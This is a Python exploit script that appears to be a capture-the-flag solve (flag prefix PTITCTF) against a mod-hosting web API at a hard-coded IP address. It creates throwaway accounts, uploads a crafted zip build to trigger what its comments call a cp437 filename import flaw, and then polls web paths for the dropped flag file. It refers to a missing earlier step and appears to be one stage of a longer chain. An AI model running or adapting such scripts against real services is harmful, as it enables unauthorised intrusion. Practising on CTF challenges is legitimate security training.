#!/usr/bin/env python3
import requests, sys, io, zipfile, secrets, time, re

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

def get_or_create_plat(tok, code, name="z"):
    r = requests.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15).json()
    for it in (r.get("results", r) if isinstance(r, dict) else r) or []:
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    rp = requests.post(f"{BASE}/api/platforms/", headers=H(tok),
        json={"code": code, "name": name}, timeout=15)
    return rp.json().get("id")

print(f"[*] Target: {BASE}")

# STEP 2: Trigger cp437 import via zip upload (standard relative path mod)
print("[*] Uploading trigger zip with ASCII filename...")
tok2, u2 = fresh()
pid_t = get_or_create_plat(tok2, "tplat")
mid_t = requests.post(f"{BASE}/api/mods/", headers=H(tok2),
    json={"title":"z", "mod_version":"v_trig1", "release_notes":"", "is_enabled":True}, timeout=15).json()["id"]
bid_t = requests.post(f"{BASE}/api/mods/{mid_t}/builds/", headers=H(tok2),
    json={"platform": pid_t}, timeout=15).json()["id"]

bio_t = io.BytesIO()
with zipfile.ZipFile(bio_t, 'w', zipfile.ZIP_DEFLATED) as zf_t:
    zf_t.writestr("trigger_file.txt", b"trigger content")
bio_t.seek(0)

# Pass filelist_file so that upload returns 200 even if storage_path fails? No, normal mod has normal path
r_trig = requests.post(f"{BASE}/api/mods/{mid_t}/builds/{bid_t}/upload/", headers=H(tok2),
    files={"zip_file": ("trigger.zip", bio_t, "application/zip")}, timeout=30)
print(f"[*] Trigger upload status: {r_trig.status_code}")

time.sleep(1)

# Check all possible output files
print(f"\n[*] Checking flag files...")
for out_name in ["flag_cp437_bfe0cd2b.txt"]:
    for url, label in [(f"{BASE}/{out_name}", "nginx /"), (f"{BASE}/media/{out_name}", "media /media/")]:
        rf = requests.get(url, timeout=10)
        print(f"  [{label}] status {rf.status_code}: {rf.text[:100] if rf.ok else ''}")
        m = re.search(r"PTITCTF\{[^}]+\}", rf.text)
        if m:
            print(f"\n==========================================")
            print(f">>> FLAG FOUND: {m.group(0)}")
            print(f"==========================================")
            with open("final_flag.txt", "w") as f:
                f.write(m.group(0) + "\n")
            sys.exit(0)
